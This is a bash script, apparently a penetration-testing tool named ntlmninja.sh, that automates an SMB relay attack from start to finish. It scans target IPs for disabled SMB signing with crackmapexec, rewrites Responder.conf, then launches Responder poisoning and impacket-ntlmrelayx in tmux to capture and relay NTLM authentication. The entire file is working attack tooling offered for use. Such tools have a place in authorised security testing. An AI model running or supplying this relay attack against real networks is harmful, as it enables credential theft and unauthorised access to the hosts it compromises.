#!/bin/bash

# =============================================================
# ntlmninja.sh - SMB Relay Attack Automation Script
# -------------------------------------------------------------
# This script automates the setup and execution of a SMB relay
# attack using tools like Responder, Impacket's ntlmrelayx,
# crackmapexec, and tmux. It scans a list of target IPs for
# misconfigured SMB signing, and if vulnerabilities are found,
# it initiates a relay attack within a tmux session.
#
# Author: Howell King Jr. | Github: https://github.com/sp3ttr0
# =============================================================

responder_config_file="/etc/responder/Responder.conf"
session_name="smb_relay_attack"
window1="responder"
window2="ntlmrelayx"
TARGET_SMB_FILE="vulnerable_smb_targets.txt" 

# Define color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Network interface (dynamically detected by default)
network_interface="$(ip route | awk '/default/ {print $5; exit}')"

# Log file
log_file="smb_relay_attack.log"
exec > >(tee -a "$log_file") 2>&1

# Print help
print_help() {
    echo -e "${BLUE}Usage: $0 [-f TARGET_FILE] [-i NETWORK_INTERFACE] [-h]${NC}"
    echo -e "  ${YELLOW}-f TARGET_FILE${NC}   File containing target IPs to scan for misconfigured SMB signing."
    echo -e "  ${YELLOW}-i NETWORK_INTERFACE${NC} Specify network interface (default: ${network_interface})."
    echo -e "  ${YELLOW}-h${NC}               Display this help and exit."
}

# Check if a tool is installed
check_tool() {
    echo -e "[*] Checking ${YELLOW}$1${NC} if installed..."
    command -v "$1" > /dev/null 2>&1 || {
        echo -e "${RED}[!] $1 is not installed. Please install it first. Exiting.${NC}"
        exit 1
    }
}

# Validate network interface
validate_network_interface() {
    if ! ip link show "$network_interface" > /dev/null 2>&1; then
        echo -e "${RED}[!] Network interface ${network_interface} not found. Exiting.${NC}"
        exit 1
    fi
}

# Run crackmapexec
run_crackmapexec() {
    if [[ ! -f "${TARGET_SMB_FILE}" ]]; then
        echo -e "[*] ${BLUE}Scanning for misconfigured SMB signing on targets...${NC}"
        echo -e "[*] ${GREEN}Generating list of vulnerable targets in ${TARGET_SMB_FILE}.${NC}"
        crackmapexec smb --gen-relay-list "${TARGET_SMB_FILE}" "${TARGET_FILE}" | grep "signing:False" | while read -r line; do
            echo -e "${YELLOW}[!] Misconfigured target: ${line}${NC}"
            echo "$line" >> "${TARGET_SMB_FILE}"
        done
    fi
}

# Edit Responder.conf file
edit_responder_conf() {
if [ -f "${responder_config_file}" ]; then
        if grep -qE '^SMB = Off$' "${responder_config_file}" && grep -qE '^HTTP = Off$' "${responder_config_file}"; then
            echo -e "[*] ${GREEN}Responder.conf already configured with SMB and HTTP set to 'Off'.${NC}"
        else
            echo -e "[*] ${YELLOW}Updating Responder.conf to turn off SMB and HTTP...${NC}"
            sudo sed -i 's/^SMB = .*/SMB = Off/' "${responder_config_file}"
            sudo sed -i 's/^HTTP = .*/HTTP = Off/' "${responder_config_file}"
            echo -e "[+] ${GREEN}Responder.conf updated successfully.${NC}"
        fi
    else
        echo -e "${RED}[!] Responder.conf file not found. Please ensure Responder is installed and configured properly.${NC}"
        exit 1
    fi
}

# Run SMB Relay Attack
run_smb_relay_attack() {
    echo -e "[*] ${BLUE}Starting SMB Relay Attack...${NC}"
    tmux new-session -d -s $session_name
    echo -e "[+] ${GREEN}Creating tmux session named ${session_name}.${NC}"
    
    tmux rename-window $window1
    echo -e "[+] ${GREEN}Starting Responder in window ${window1}.${NC}"
    tmux send-keys "responder -I ${network_interface}" C-m

    tmux new-window -n $window2
    echo -e "[+] ${GREEN}Starting ntlmrelayx in window ${window2}.${NC}"
    tmux send-keys "impacket-ntlmrelayx -smb2support -tf ${TARGET_SMB_FILE}" C-m

    tmux -CC attach-session -t $session_name
}

while getopts "f:hi:" opt; do
    case $opt in
    f)
        TARGET_FILE="$OPTARG"
        ;;
    h)
        print_help
        exit 0
        ;;
    i)
        network_interface="$OPTARG"
        ;;
    \?)
        echo -e "${RED}[!] Invalid option: -$OPTARG${NC}" >&2
        exit 1
        ;;
    :)
        echo -e "${RED}[!] Option -$OPTARG requires an argument.${NC}" >&2
        exit 1
        ;;
    esac
done

# Start SMB Relay Attack
if  tmux list-session | grep -qE "^$session_name:" > /dev/null; then
    echo -e "${RED}[!] Session name ${session_name} already exists.${NC}"
    # attach tmux session
    tmux -CC attach-session -t $session_name
else
    # Check required arguments
    if [ -z "${TARGET_FILE}" ]; then
        echo -e "${RED}[!] Usage: ./$0 [-f TARGET_FILE] [-i NETWORK_INTERFACE]${NC}"
        exit 1
    fi
    
    validate_network_interface
    # Check if required tools are installed
    check_tool "tmux"
    check_tool "responder"
    check_tool "impacket-ntlmrelayx"
    check_tool "crackmapexec"
    
    run_crackmapexec
    
    if [ -s "${TARGET_SMB_FILE}" ]; then
        edit_responder_conf
        sleep 2
        run_smb_relay_attack
    else
        echo -e "${RED}[!] There are no misconfigured smb signing targets found. Exiting...${NC}"
    fi
fi
